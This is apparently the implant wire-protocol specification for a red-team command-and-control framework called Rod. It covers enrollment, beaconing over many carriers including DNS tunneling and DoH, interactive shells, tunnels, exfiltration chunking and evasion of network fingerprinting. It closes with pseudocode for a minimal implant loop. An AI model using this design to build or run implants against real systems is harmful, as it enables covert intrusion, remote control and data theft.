# Rod -- Implant contract

The compliance ladder and wire reference for a from-scratch implant. The wire
protocol is the product (architecture.md Sec 4.2, Sec 12.2): any language that
can speak it can be a Rod implant. This file defines what "speak it" minimally
means, every byte-level shape an implant author needs, what is optional
hardening, and the rules that keep the minimum small while the platform grows.
The reference .NET implant (`src/implant/dotnet/`) implements every tier; it
is the worked example, not the obligation.

The contract sources are `src/teamserver/Rod.Protocol/protos/rod.proto` (the
authoritative wire messages -- compile it with your own toolchain), this wire
reference, and the baked build profile a build unit emits. Everything here is
verified against the teamserver code; where behavior differs, rod.proto and
the code win and this file is a bug.

## Wire reference

### Endpoints

A deployment exposes five implant-facing endpoints (listener configuration,
architecture.md Sec 8):

| Purpose | Transport | Route |
|---------|-----------|-------|
| Enroll | Plain HTTP(S), anonymous | `POST /implants/enroll` |
| Enroll (QUIC) | QUIC (TLS 1.3), token-identified | `quic://host:port`, ALPN `rod1` |
| Beacon / tasking (stream) | gRPC over mutual TLS | `/rod.v1.Beacon/CheckIn` |
| Beacon / tasking (envelope) | Plain HTTP(S) POST, key-authenticated | `POST /implants/beacon` |
| Beacon / tasking (WebSocket) | Plain HTTP(S) upgrade, key-authenticated | `GET /implants/beacon/stream` |
| Beacon / tasking (QUIC stream) | QUIC (TLS 1.3), handshake-identified | `quic://host:port`, ALPN `rod1` |

The enroll listener accepts plain JSON with no client certificate -- the
implant authenticates with the one-use stager token, not a cert it does not
have yet. The stream listener requires a client certificate that chains to
the engagement CA (enrollment is what mints it); the envelope route is the
web transports' poll shape, authenticated by the per-artifact key the build
baked -- no TLS client certificate anywhere on it. The beacon shapes carry
the same frames -- the streams (gRPC, WebSocket, QUIC) are the interactive
shape (server-push tasking, live channels), the envelope the poll shape that
needs no gRPC stack.

### TLS shape

- **Stream client certificate:** the leaf issued at enroll, paired with the
  implant's own private key. It binds `(implant_id, engagement_id)` -- the
  server's authoritative identity check is "the cert's engagement equals the
  enrolled implant's engagement" (architecture.md Sec 9). Only the mTLS
  listener asks to see it; the `http`/`https` listeners never send a TLS
  `CertificateRequest` (it is itself a fingerprint), and the envelope
  check-in authenticates under the baked key instead.
- **Server identity:** the teamserver presents the engagement CA certificate
  itself as its server identity (it carries no SANs). Pin **chain-to-CA**, not
  DNS names: build the chain with the enrolled CA chain in the trust store,
  allow the unknown-CA error, then require the chain root's fingerprint to
  equal one of the enrolled CA certificates. This mirrors what the reference
  client does (`C2.PinServerChain`).

### Enrollment

`POST /implants/enroll`, `Content-Type: application/json`, camelCase JSON:

```json
{
  "stagerTokenSecret": "<the one-use secret the operator minted>",
  "publicKey": "<base64 DER SubjectPublicKeyInfo of your ECDSA P-256 public key>",
  "class": "Stage2",
  "parentImplantId": null
}
```

`publicKey` is what makes the implant own its identity: submit the public
half, keep the private half, and the returned leaf is signed over your key.
`class` is optional (defaults `Stage2`); `parentImplantId` is set only by a
child derivation (`lateral.move`). A malleable profile may wrap the whole JSON
body as a single base64 JSON string (the profile's base64 envelope) -- the
teamserver accepts both shapes.

Response `200 OK`:

```json
{
  "status": 1,
  "implantId": "<guid>",
  "engagementId": "<guid>",
  "leafCertificate": "<base64 DER leaf, signed over your public key>",
  "caChain": ["<base64 DER CA cert>"],
  "parentImplantId": null
}
```

`status` is the proto `EnrollStatus`: `1` OK, `2` bad token, `3` expired,
`4` spent. A token failure answers `401` with the status set and no
certificate material; a malformed body answers `400`. Bad/expired/spent are
**definitive** -- do not retry them. Transport failures (connection refused,
timeout) are worth retrying with exponential backoff.

### The CheckIn stream

One bidirectional gRPC stream, method `/rod.v1.Beacon/CheckIn`, protobuf
messages defined in rod.proto. The unit that crosses the stream is `Frame`:
an opaque `payload` plus, upstream only, a `kind` discriminator. The server's
message cap is 2 MiB per frame; keep a single payload near or under 1 MiB and
chunk anything larger.

**Frame order:**

1. The implant speaks first: one `Frame` whose payload is a `HandshakeRequest`
   (protocol version `1.0`, the implant id, the advertised verb list, and
   optionally the replay-nonce and receive-ack advertisements -- see the
   signature section and the dispatch strand below).
2. The server answers with one `Frame` whose payload is a `HandshakeResponse`.
   `status` must be `1` (`OK`); anything else is **permanent for this
   artifact** -- terminate rather than retry:
   `2` version mismatch, `3` unknown implant, `4` identity mismatch,
   `5` kill date expired, `6` implant retired.
3. Thereafter the stream carries tasking downstream (`TaskRequest` payloads,
   no kind set -- discriminate positionally after the handshake) and results
   upstream (`TaskResult` with `kind = FRAME_KIND_TASK_RESULT`, `TaskAck`
   with `kind = FRAME_KIND_TASK_ACK` (the receive-ack arm below),
   `ExfilChunk` with `kind = FRAME_KIND_EXFIL_CHUNK`, `StagedPull` with
   `kind = FRAME_KIND_STAGED_PULL`, `ChannelOutput` with
   `kind = FRAME_KIND_CHANNEL_OUTPUT`). An upstream frame with `kind`
   unset is tolerated as a `TaskResult` (legacy shape). One downstream frame
   does set its kind: `ChannelInput` (`kind = FRAME_KIND_CHANNEL_INPUT`), the
   operator input half of an interactive channel -- discriminate downstream
   frames on kind first and fall back to the positional `TaskRequest` parse
   for kindless frames. The server routes a `ChannelInput` only to an implant
   whose handshake advertised the channel verb, so an implant that never
   opted in never receives a kind-bearing downstream frame.

**The dispatch strand (receive acks).** Set `task_acks` in the handshake and
the server echoes it: from then on, ack every parsed `TaskRequest` with a
`TaskAck` frame (its `task_id`) *before* executing it. The ack is delivery
evidence, not execution evidence -- it says the frame crossed intact. A
stream that dies before the ack makes the server redeliver the task on the
next check-in, so delivery is at-least-once and the implant owes two things:
recognize a task id it already parsed (re-ack it, never run it twice), and
re-send a cached result when the original delivery died with a stream -- the
server records first-wins, so a duplicate result is a no-op there. The
negotiation is per handshake by design: stop advertising and the arm is off
for that connection, keeping an unupgraded pair on today's semantics (a
written frame counts as delivered). Over the poll carriers (the envelope,
the pipe/TCP check-ins) the ack rides the next request body and the server
accepts it inertly -- those carriers answer whole or not at all and never
requeue on acks; the dedup still pays, because a task requeued by a dead
stream can be redelivered over any carrier the run lands on. DNS carries no
ack at all (no handshake rides it).

**Using the stream:** hold it open for the session (stream mode -- the
interactive shape, server pushes tasking the moment it is queued) or run
check-in cycles (poll mode -- drain queued tasking, half-close, wait for the
server to end the stream, sleep the baked interval with jitter, reconnect and
re-handshake). Both are Tier 0; the server treats them identically and reuses
the implant's session across reconnects.

### The envelope check-in (the web check-in)

`POST /implants/beacon` against any web listener (`http` and `https` fronts
alike; an mTLS front serves it too, where the client certificate resolves
first). The body is a sequence of rod.v1 `Frame` messages, each prefixed with
its byte length as an unsigned protobuf varint -- the canonical
delimited-stream shape every protobuf runtime ships -- sealed under the
per-artifact key the build baked (below). One POST is one poll check-in:

- **Request body:** the sealed envelope (or, on a lab build with check-in
  protection off, the raw framed sequence) whose plaintext is a strictly
  increasing 8-byte big-endian counter ahead of the handshake `Frame` first,
  then any `TaskResult`, `TaskAck`, `ExfilChunk`, `StagedPull`, and
  `ChannelOutput`
  frames. The server's caps are 2 MiB per frame, 1024 frames, and 16 MiB per
  wire body (the frames inside a sealed body ride a ~3/4 share of that --
  base64 overhead): an oversized frame, count, or body answers `413`,
  malformed framing answers `400`, and a body that does not verify under its
  artifact key, a counter at or below the accepted floor, or a plaintext body
  from an implant bound to a key answers `401`.
- **Response body:** the same seal, under the response's own purpose tag --
  the `HandshakeResponse` frame first, then the `StagedChunk` run answering
  each request-body `StagedPull` (in demand order), then dispatched
  `TaskRequest` frames in queue order while the 4 MiB dispatch budget lasts
  -- what does not fit is requeued and rides the next check-in. A non-OK
  handshake response is the only frame in the body: the check-in is refused,
  and every non-OK status is permanent exactly as on the stream.
- **Poll discipline:** check in, drain, close, sleep the baked interval with
  jitter, repeat. Every POST re-handshakes; the server reuses the session
  across check-ins, so the cadence neither churns session entities nor
  floods the engagement trail with `SessionOpened` records. Burn the counter
  on every attempt, not every delivery: a retransmitted batch after a lost
  response must carry a fresh counter, and the batch semantics make the
  retransmission itself idempotent (a re-sent result for a completed task is
  a no-op server-side).
- **The envelope's bounds:** an artifact's `ExfilChunk` run must begin and
  end inside one request body (the reassembler is per-request), and a
  channel task (`shell.interact`) claims over the envelope under the
  degraded discipline below -- only DNS never claims one, because a
  datagram poll has no stream to carry the input half.

**The degraded channel discipline (always carried).** Every poll-mode
build advertises the `channels.poll` capability in its handshake, and the
interactive verbs claim over its envelope cycles -- operator input parks
server-side and rides the next check-in's response as `ChannelInput`
frames, the implant's `ChannelOutput` and the channel's final
`TaskResult` batch upstream like any other frames, and a channel the
implant stops collecting closes with a timeout `TaskResult` instead of
sitting dispatched. The tradeoff is the operator's to make, not the
bake's: while a channel is open, the interactive traffic rides at the
check-in cadence -- every keystroke costs up to one interval down and one
interval back.

The frame contents, the handshake order, the signature discipline, and
the result/chunk grammar are identical to the stream's -- only the carriage
changes. An implant that implements the envelope needs an HTTP client, a
protobuf codec, and AES-256-GCM, nothing else.

#### The sealed body

The default build shape (check-in protection on) seals both directions under
the per-artifact key the build minted and baked -- the same key, wire shape,
and byte layout as the opt-in AES-GCM enroll envelope, but under its own
purpose tags so neither direction's ciphertext can be replayed as the
other's:

```
body   := base64( b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16) )
AAD    := "rod-checkin-v1"        (requests)
        | "rod-checkin-response-v1"  (responses)
plain  := counter(8, big-endian) || delimited-frames    (requests)
        | delimited-frames                                (responses)
```

The key is standard base64 of `keyId(16) || key(32)` in the baked profile's
`envelopeKey`; the `checkinEnvelope` profile key says `"aesgcm"` (seal) or
`"none"` (the lab-debug plaintext frame). Possession of the key is the
authentication -- the web transports request no TLS client certificate at
all -- and the seal is the confidentiality: over cleartext `http`, everything
past the TLS-less wire is still ciphertext to a listener.

### The WebSocket beacon (the web posture's stream)

`GET /implants/beacon/stream` against any web listener -- the same route
family as enroll and the envelope, upgraded to a WebSocket. This is the web
posture's interactive shape: the same live session the gRPC stream runs
(server-push tasking the moment it is queued, `ChannelInput` frames flowing
down while a channel runs) over a socket any HTTP client runtime can open,
with the envelope's own authentication -- no gRPC stack, no TLS client
certificate anywhere.

The message grammar is the envelope's body grammar, message-shaped:

- **First client message:** exactly the envelope check-in's request body --
  the sealed envelope (or the lab build's raw framed sequence) whose
  plaintext is a fresh counter ahead of the handshake `Frame` first, then
  any `TaskResult`, `ExfilChunk`, `StagedPull`, and `ChannelOutput` frames.
  The same key-posture gates apply: a key-bound implant must seal under
  exactly its bound key, and the counter must clear the accepted floor.
- **First server message:** the envelope check-in's response shape -- the
  `HandshakeResponse` frame first (sealed when the client sealed; a non-OK
  status is the only frame and the connection ends, permanent as on every
  transport).
- **Every later message, both directions:** the same sealed-or-plaintext
  body, minus the handshake. The server sends one frame per message -- a
  pushed `TaskRequest`, a `StagedChunk` run, a `ChannelInput` unit -- and
  reads whatever delimited sequence a client batches. Each client message
  burns its own counter, exactly like a POST.

The connection is the session's carrier, not the session: a disconnect ends
the channel halves with it (channels are session-scoped, as on the gRPC
stream) but the session itself stays live -- reconnect, re-handshake, and
the queue continues. The frame contents, the handshake order, the signature
and replay-nonce discipline, and the staged/channel grammar are identical to
the gRPC stream's -- only the carriage changes. An implant that implements
the envelope needs a WebSocket client, a protobuf codec, and AES-256-GCM --
the same bar the envelope sets, plus the socket.

### Task results and bulk data

A `TaskResult` echoes the task id with an outcome (`1` succeeded, `2` failed)
and an output string. Bulk data (file contents, large captures) does **not**
ride the output string: emit `ExfilChunk` frames after the `TaskResult`, each
carrying the task id, an artifact name, a MIME content type, a 0-origin
sequence, and a terminal flag on the last one. The teamserver reassembles
strictly by sequence into the engagement artifact store. Keep chunks at or
under 512 KiB.

### Staged uploads (downstream bulk)

A `TaskRequest` whose `staged_bytes` field is set carries its bulk payload
server-side, not in the arguments string: the arguments end with a
`sha256:<hex>` token -- part of the signed tuple, so the payload is exactly as
tamper-evident as an inline one -- and the bytes must be demanded before the
task reports a result. Send one `Frame` with `kind = FRAME_KIND_STAGED_PULL`
and a `StagedPull{task_id}` payload; the server answers on the same stream with
a run of `StagedChunk` frames (`task_id` echo, 0-origin sequence, terminal on
the last, 512 KiB data slices). Reassemble, verify the sha256 against the
arguments token, then run the verb against the reassembled bytes and report the
`TaskResult` as usual. Nothing bulk ever flows downstream unasked.

### Interactive channels (the streaming task shape)

`shell.interact` is `shell.exec`'s live shape, and `tunnel.forward` is the
port-forward bridge (architecture.md Sec 5.2, Sec 14): each `TaskRequest`
opens a channel instead of a one-shot round trip, and the task does not
complete until the channel ends. Flow:

1. Receive the `TaskRequest` like any other and verify its signature. Its
   `arguments` are an optional initial command (the shell) or `<host> <port>`
   (the tunnel: connect from the implant's own vantage).
2. Stream whatever the task produces as `ChannelOutput` frames
   (`kind = FRAME_KIND_CHANNEL_OUTPUT`, payload `ChannelOutput{task_id,
   data}`), in order, as it is produced. The teamserver decodes and
   accumulates the chunks onto the task's transcript live -- an operator
   reads the channel while it runs.
3. Receive the operator's bytes as `ChannelInput` frames downstream
   (`kind = FRAME_KIND_CHANNEL_INPUT`, payload `ChannelInput{task_id, data,
   eof}`), which may interleave with anything else on the stream; route them
   by `task_id`. `eof` means the operator closed the channel's stdin -- for
   the shell that ends the session; for the tunnel it half-closes the TCP
   send side, and answers already in flight still land.
4. End the channel with an ordinary `TaskResult` for the task -- the shell
   exited, the tunneled peer closed its side, or the channel failed. The
   server appends the final output to the transcript and completes the task
   with it as the record.

The channel is session-scoped: it lives on the CheckIn stream that carried
its `TaskRequest`, and a stream drop ends it (kill the shell or close the
tunnel; the task stays dispatched server-side). Input is not signed -- like a
`StagedChunk` run it rides the mTLS stream the signed `TaskRequest` opened.
Keep output chunks at or under 16 KiB. The server routes `ChannelInput` only
for a task whose verb is one of these channel verbs (`shell.interact`,
`tunnel.forward`); a channel task claims over every poll carrier under the
store-and-forward discipline (below) -- the envelope cycle, the stream
family's polls, and the DNS grammar alike (input on the TXT answers,
output as `c.` queries).

For a tunnel the channel is byte-transparent: the relayed protocol is none
of the wire contract's business, and the task's final output is the relay
summary (`tunnel to host:port closed: relayed N bytes up, M bytes down`).
The transcript accumulates as UTF-8 text, so binary tunnel traffic renders
with replacement characters -- the traffic's attribution is the task record
and the summary, not byte fidelity in the transcript.

### Stream check-ins (named pipe / raw TCP, the no-egress transports)

The SMB and TCP listeners carry the envelope's frames over a raw duplex
stream -- a named pipe (`\\host\pipe\name`) for Windows segments without
HTTP or DNS egress, or a plain TCP socket for segment networks that allow
sockets but no HTTP shape. One connection is one poll check-in:

1. Connect to the entry's public endpoint (the pipe path, or `host:port`).
2. Write one request message: a varint byte length, then exactly that many
   bytes of the envelope's delimited frame sequence (the handshake frame
   first, then any results, exfil chunks, staged pulls, channel output).
3. Read one response message: the same shape -- a varint byte length, then
   the handshake response, staged chunk runs answering the request's
   demands, and queued tasking while the 4 MiB dispatch budget lasts.
4. Close; sleep the baked interval; reconnect for the next check-in.

**Enrollment over the stream check-in.** The opening request message may
carry a kind-bearing `EnrollRequest` frame ahead of its handshake -- the
same enroll body the web route carries, promoted into the frame grammar
(token secret, class, the implant's public key as DER
SubjectPublicKeyInfo, parent, host facts, kill date). The server answers
it as its own response message, a single `EnrollResponse` frame (`Ok`
with the implant id, engagement id, leaf certificate, CA chain, and --
when the redeemed token names a build -- the per-artifact check-in key;
a refusal carries just the status, no signal beyond no). After an
acceptance the ordinary handshake follows on the same connection, so a
no-egress segment can enroll its first implant over the pipe or socket
it already reaches; a client may also close after the enroll exchange
and check in on fresh connections. A baked per-artifact key seals the
whole carriage -- the enroll exchange and every check-in message are
AES-256-GCM under it (the check-in body wrapping a fresh big-endian
counter the server floors; each direction under its own purpose tag), the
same seal the cleartext http posture carries, so a bare wire leaks no
frame bytes. The reference implant's socket module
carries all of it: the dial shapes are `tcp://host:port` and
`smb://host/pipe/name` (a dot host is the local machine), and the check-in
cycle is the envelope's own request/response shape over the message framing,
with the interactive verbs on the shared store-and-forward carriage.

**The stream mode (the held live session).** A stream-mode bake over these
fronts holds the connection instead of cycling it: the handshake advertises
the `channels.live` capability, the server answers the handshake response as
its own message, and the connection then runs the live session the web
WebSocket beacon and the QUIC session run -- queued tasking pushed as its
own message the moment it is issued (no request preceding it), result and
channel-output messages sent as they happen, live channels for the
streaming verbs, staged pulls answered by pushed chunk runs. A dropped
connection is a reconnect, not a termination: the session survives
server-side, the next cycle re-handshakes on a fresh connection. The seal
is the poll shape's own (a fresh counter per message, each direction under
its own purpose tag). An older teamserver that does not know the
advertisement serves the connection as an ordinary poll check-in, so the
capability is a graceful step up, never a break.

No client certificate rides these transports: the implant is identified by
the id in its handshake (the DNS posture, extended to a handshake-capable
transport), and a refused handshake answers a bare `Unspecified`. Dispatched
tasking keeps the full signature posture -- verify it exactly like a
stream-delivered task. Channel tasks claim under the store-and-forward
discipline every poll artifact advertises (`channels.poll` in the
handshake): operator input parks server-side and rides the next
connection's response as `ChannelInput` frames, channel output batches
upstream like any other frame. Oversized or malformed messages drop the
connection without an answer.

### The QUIC stream (UDP egress, the duplex socket transport)

The QUIC listener carries the live session over a QUIC connection -- for
egress that passes UDP/443 (where HTTP/3-era traffic lives) but blocks TCP.
It is the interactive tier over a datagram egress: server-push tasking the
moment it is queued, `ChannelInput` frames flowing down while a channel
runs, the same session the gRPC stream and the WebSocket beacon hold. A
build names a QUIC listener as its beacon and the baked endpoint carries the
transport's own scheme (`quic://host:port`) -- the dial shape picks the
client. Either mode bakes: stream holds the session open; poll ends each
cycle when the tasking queue drains inside a short idle window (250 ms),
sleeps the baked cadence, and reconnects -- one session per check-in, the
session surviving server-side across the disconnects. A poll run carries
the interactive verbs store-and-forward on its cycles, the same shared
discipline every poll client runs.

The carriage is one connection, one client-initiated bidirectional stream,
one session:

1. Dial the entry's public endpoint over QUIC with ALPN `rod1`, TLS 1.3,
   pinning chain-to-CA exactly like every other dial (the QUIC front
   presents the engagement CA's server leaf and requests no client
   certificate -- the web posture's fingerprint rule; QUIC cannot ride
   cleartext at all).
2. Open one bidirectional stream and speak first: one message -- a varint
   byte length, then the envelope's delimited frame sequence with the
   handshake `Frame` alone (any further frames in the message are ingested
   as upstream traffic, the envelope's order).
3. Read one response message: the same shape, the handshake response frame
   first. A non-OK status is the only frame and the connection ends,
   permanent as on every transport.
4. Hold the stream: every later message is the same delimited sequence, one
   frame per message downstream (a pushed `TaskRequest`, a `StagedChunk`
   run, a `ChannelInput` unit) and whatever sequence the implant batches
   upstream (results, exfil chunks, staged pulls, channel output).
5. On a drop, reconnect and re-handshake: the session survives the
   connection server-side, the same reconnect semantics the other stream
   clients keep. Send QUIC keep-alives (the reference client pings every
   30s) -- the listener drops a connection silent past two minutes.

**Enrollment over the QUIC stream.** The opening stream's first exchange may
be an enroll instead of a handshake -- the full-independence step
(architecture.md Sec 8): an implant whose baked enroll endpoint is
quic-schemed needs no HTTP shape at all. Where step 2 above would send the
handshake `Frame`, send instead a `Frame` with kind
`FRAME_KIND_ENROLL_REQUEST` whose payload is an `EnrollRequest` message --
the same enroll body the web route carries as JSON (token secret, class, the
implant's public key as a DER SubjectPublicKeyInfo, parent, host facts, kill
date), promoted into the frame grammar. The server answers one message: a
`Frame` with kind `FRAME_KIND_ENROLL_RESPONSE` carrying an `EnrollResponse`.
On a non-OK status that frame is the only answer and the connection ends,
the same statuses the web route's 401s carry; on OK the frame carries the
new identity (implant id, engagement), the leaf certificate and CA chain as
raw bytes, the echoed parent, and -- when the redeemed token's build minted
one -- the per-artifact check-in key (`envelope_key_id` is the 16-byte key
id, `envelope_key` the 32-byte AES-256 key, the same packed halves the baked
envelope key carries as base64). The ordinary handshake follows immediately
on the same stream with the identity the enroll issued: one connection
carries enroll-then-session, and every reconnect carries the handshake
alone. The listener scopes the exchange to its own engagement -- a token
minted for another engagement is refused whole and unspent -- with the same
refusal rules and audit arc the web enroll route applies. The reference
implant's QUIC enroll client requires the pinned CA (the bake always pins
one); the QUIC dial has no system-root fallback.

The identity is the certificate-less posture the pipe and raw TCP carry: no
client certificate is requested anywhere, so the implant is identified by
the id in its handshake, with the enrolled, kill-date, and retired gates
applying in full; dispatched tasking keeps the complete signature posture.
The message budget is the envelope's wire-body cap (16 MiB); a malformed or
oversized message drops the connection without an answer. The transport
needs a QUIC stack on the host (one ships with current Windows and macOS;
Linux needs libmsquic) -- the listener refuses its bind without one and the
reference client terminates with the cause. Channels are session-scoped as
on every stream: the connection's end closes the channel halves with it.

### DNS check-ins (Tier 2, the egress-restricted transport)

A DNS listener entry answers TXT queries over UDP under its zone (the entry's
public endpoint). The check-in grammar encodes into the query NAME as lowercase
RFC 4648 base32 labels, no padding:

```
poll:          p.<b32(implant id)>.<zone>
key-named poll:k.<b32(implant id)>.<b32(key id)>.<zone>
result chunk:  r.<b32(task id)>.<s|f>.<seq>.<t|m>.<b32(chunk)>.<b32(implant id)>.<zone>
channel chunk: c.<b32(task id)>.<seq>.<t|m>.<b32(chunk)>.<b32(implant id)>.<zone>
enroll chunk:  e.<b32(stream id)>.<seq>.<t|m>.<b32(chunk)>.<zone>
enroll answer: a.<b32(token)>.<seq>.<zone>
delivery probe:n.<b32(task id)>.<b32(sha128)>.<b32(implant id)>.<zone>
```

**Sealing (a build that baked an envelope key).** The check-in carriage
seals like the enroll exchange does, so the resolver chain reads no frame
bytes in the clear: the implant polls `k.`-named -- the key id rides the
name as its raw 16 guid bytes -- and the answer's TXT payload is the
base32 of a raw `R1` AES-GCM body (`R1 || keyId || nonce || ciphertext ||
tag`, the envelope family's own shape without the base64 layer) under the
`rod-dns-poll-v1` purpose tag; open it, then read the kind byte as
ordinary. Results and channel outputs seal whole before chunking (one
body per report, not per chunk) under `rod-dns-result-v1` and
`rod-dns-channel-v1` respectively -- the `s|f` outcome flag and the task
id stay in the name, where they ride either way. The server resolves the
key by the id on the wire, so sealing survives a teamserver restart with
nothing re-established. A plaintext answer to a sealed poll (the key's
payload record was deleted) still carries its kind byte: run it -- the
signature, not the seal, gates execution. Symmetrically, the server
refuses the downgrade for a key-bound implant: a plain `p.` poll is
answered empty, and a plaintext result or channel reassembly is dropped.

A poll is answered with zero or one TXT record whose strings concatenate to
the base32 of a kind byte plus its message: `t` names a signed
`TaskRequest` (verify it exactly like a stream-delivered one -- the
signature covers the canonical tuple); `i` names the parked channel input
the store-and-forward discipline drained -- every collected
`ChannelInput` frame, each length-prefixed (a varint byte length ahead of
its message), so a typing burst and its eof cross together. An empty
answer means no tasking and no parked input. A result is reported as
chunked queries (0-origin `seq`, `t` terminal
or `m` more, UTF-8 chunks; an empty chunk rides as the bare label `e`),
answered with an empty NOERROR. A live channel's output chunks up the
same way as `c.` queries: the chunks reassemble into the channel's data
bytes (the task id rides the name), landing on the task's transcript
through the shared composition every carrier uses. Send EDNS0 (the answers ride up to 1232
bytes); short-argument tasking only -- a task that does not fit is not
delivered over DNS.

**Delivery confirmation (the retransmission half).** A datagram carrier
loses chunks, and a gap in a report's 0..n sequence drops the server's
reassembly whole -- so a report is not delivered when its queries were
sent, but when the server confirms the exact blob landed. After chunking
a result or channel output, probe
`n.<b32(task id)>.<b32(first 16 bytes of SHA-256 over the plaintext)>.<b32(implant id)>.<zone>`:
the TXT answer is `y` once that blob's reassembly reached recording
(base32 like every TXT payload here), `n` while it has not. Keep the
frame pending until `y` and re-send the whole chunk sequence on later
cycles -- first-wins recording makes the re-send idempotent, and the
restarted-server case is one redundant re-send. The reference implant's
flush loop does exactly this.

**Record types beyond TXT (the cover).** An A query anywhere under the
zone answers one A record -- the bind's own host when the bind is a
concrete address, else a deterministic per-name address in
198.18.0.0/15 (TTL 60). A zone that answered TXT for random labels but
NXDOMAIN for every A query would itself be the fingerprint; an ordinary
v4 zone answers its A records, so this one does too. AAAA and every
other type keep the NXDOMAIN a v4-only zone would give; a query outside
the zone is REFUSED (this listener is not an open resolver).

**Enrollment over DNS (the full-independence step for a DNS-only target).**
The enroll body -- the framed `EnrollRequest`, sealed under the baked
per-artifact key when the artifact carries one (the raw base64 of the sealed
envelope, so the token secret never crosses the resolver chain in the clear)
-- uploads as chunked `e.` queries keyed by a client-chosen random stream id,
each answered `+` until the terminal chunk's answer names a download token
(`=<b32(token)>`). The `EnrollResponse` -- framed, sealed under the same key
when the upload was -- downloads as token-keyed `a.` answers (`<t|m>.<b32(chunk)>`,
0-origin, terminal-flagged). The terminal upload chunk drives the shared
scoped-enrollment flow against the answering listener's engagement; an
accepted DNS enrollment opens the session itself (no handshake exists to
open it), and the polls that follow refresh what it wrote. A manually minted
token names no build, so its exchange rides plaintext and the key arrives in
the answer. The whole lifecycle rides the one carrier -- the lightweight
implant a DNS-only target runs.

The transport's identity tradeoff is deliberate: no handshake and no mTLS ride
the DNS check-in path -- an implant is identified by its id alone on polls
and results (the sealed enroll exchange authenticates by key possession).
Downstream tasking keeps the full
Tier 1 posture: verify the signature before executing anything received over
DNS. The reference implant's DNS client dials a beacon URL of the shapes
`dns://<resolver-host>[:<port>]/<zone>` (the resolver is the listener
itself; a build naming a DNS listener bakes the listener's bind, and a
wildcard bind is refused with that fix), `dns://<zone>` (the host's own
configured resolver -- the production shape for a delegated zone, the
queries riding whatever DNS server the host uses), and
`doh://<resolver-host>[:<port>]/<zone>` (the DoH carriage, RFC 8484: the
same wire message riding an HTTPS POST body to /dns-query, TLS anchored to
the enrolled CA chain -- DNS-shaped traffic that blends as HTTPS).

**The DoH carriage (RFC 8484).** A `doh` listener entry answers the same
grammar over HTTPS: the DNS wire message rides an HTTP body -- `GET
/dns-query?dns=<urlsafe-base64>` or `POST /dns-query` with
`application/dns-message` -- and the response is the same wire message the
UDP socket would return. The entry's public endpoint is its zone, the UDP
listener's model; the arrival port resolves which `doh` listener answers,
and a socket no `doh` listener owns returns an ordinary 404. The TLS
posture is the single-port https shape (no client certificate request --
a resolver front must not fingerprint), and the identity tradeoff is
DNS's own: id alone, session opened elsewhere, signatures verified. The
carriage changes; the answer never does.

### Tasking signature verification (Tier 1, recommended)

Every dispatched `TaskRequest` carries an RSASSA-PSS/SHA-256 signature made by
the tasking CA -- the same CA whose chain the implant holds from enrollment.
Verify before executing; report a failure as a `Failed` task rather than
running anything. The signed bytes are a fixed canonical encoding (NOT the
serialized message), so every language verifies identically:

```
canonical = ""
for value in [my_own_implant_id, task.task_id, task.verb, task.arguments]:
    bytes   = utf8(value)
    canonical += uint32_little_endian(len(bytes)) + bytes
verify RSASSA-PSS(SHA-256) over canonical with each RSA-bearing CA public key
```

The implant id in the tuple is the **verifier's own** id, not a wire field:
tasking signed for another implant fails verification on yours, so captured
tasking cannot be replayed cross-implant.

**Fronted tasking (Tier 2, the fronting arm).** The one exception to "the
verifier's own id": a frame whose `target_implant_id` is set names a Pivot
child the server directed to your stream (architecture.md Sec 5.2, Sec 10.3)
-- a host that cannot run an implant of its own, fronted by yours. Verify the
tuple against `target_implant_id`, not your own id; the signature was made
for the child, and that is exactly what binds the task to its executor. An
implant that derives children should front only what it enrolled (keep the
child ids from your enroll responses and refuse frames naming anything else),
and nonce rules follow the target: a fronted frame is nonce-less, because the
child never handshakes. An implant that does not implement fronting ignores
the unknown field and fails the verb on its own terms; a server never fronts
tasking to one that does not, so the field is absent on every frame a
non-fronting implant receives.

**Replay nonces (Tier 1, the negotiated arm).** The tuple above still
verifies a captured frame replayed to the *same* implant. Close that by
negotiating the replay-nonce arm: set `replay_nonces` on your
`HandshakeRequest`; a server that supports it echoes `replay_nonces` on the
`HandshakeResponse`, and from then on every dispatched task carries
`task_nonce` -- a per-implant monotonic counter -- and the signed tuple grows
a fifth element:

```
tuple = [my_own_implant_id, task.task_id, task.verb, task.arguments]
if task has task_nonce:  # always, once negotiated
    tuple += [decimal_string(task.task_nonce)]
```

Track the highest nonce you accepted (for your whole run, not per connection)
and refuse any task whose nonce is at or below it -- the signature is still
genuine, but the frame is a replay. Once negotiated, refuse nonce-less
tasking too: it is not the shape you agreed to. Report each refusal as the
task's `Failed` result so the attack surfaces on the task. A server that does
not echo the arm keeps the four-element shape, and an implant that never
advertises keeps receiving it -- the addition is negotiated, never imposed.

## Tier 0 -- Interop (required)

The smallest implant that enrolls, checks in, and executes tasking:

1. **Enroll.** Generate an ECDSA P-256 key pair. POST the public key with the
   stager token. Receive the ids, the leaf, and the CA chain. Keep the private
   key; never transmit it.
2. **Beacon.** Open `/rod.v1.Beacon/CheckIn` over mTLS with the leaf -- or
   POST the envelope route (`/implants/beacon`, above) with no gRPC stack:
   the default build bakes a per-artifact key, and every check-in body seals
   under it covering a fresh counter (a lab build with protection off sends
   the plaintext frames, on the cleartext front only).
3. **Handshake.** Send the `HandshakeRequest` first; require OK; treat every
   other status as permanent.
4. **Task loop.** Parse each downstream `TaskRequest`, execute its verb
   against its opaque argument string, and write a `TaskResult` echoing the
   task id. The verb grammar belongs to the implant's own handlers; the server
   gates verbs, it does not parse arguments.

In pseudocode, the whole obligation:

```
key    = ecdsa_p256()
enroll = post_json("https://teamserver/implants/enroll",
                   {"stagerTokenSecret": token,
                    "publicKey": b64(key.spki_der)})
leaf   = cert(enroll.leafCertificate) paired with key
cas    = [cert(b) for b in enroll.caChain]

forever:
    # The envelope alternative drops the gRPC stack entirely: one HTTP(S) POST
    # to /implants/beacon per cycle, the frames sealed (counter || frames)
    # under the baked key, the response opened the same way.
    stream = grpc_connect("teamserver:port", mTLS(leaf, trust = chain_to(cas)))
    send Frame(payload = HandshakeRequest{1, 0, enroll.implantId, my_verbs})
    if HandshakeResponse.parse(recv()).status != OK: exit

    while task = TaskRequest.parse(next_downstream_frame()):
        if not verify_tasking(cas, task, my_id = enroll.implantId):
            send Frame(TASK_RESULT, TaskResult{task.id, Failed, "rejected"}); continue
        outcome, output, chunks = my_handlers[task.verb](task.arguments)
        send Frame(TASK_RESULT, TaskResult{task.id, outcome, output})
        for c in chunks: send Frame(EXFIL_CHUNK, c)

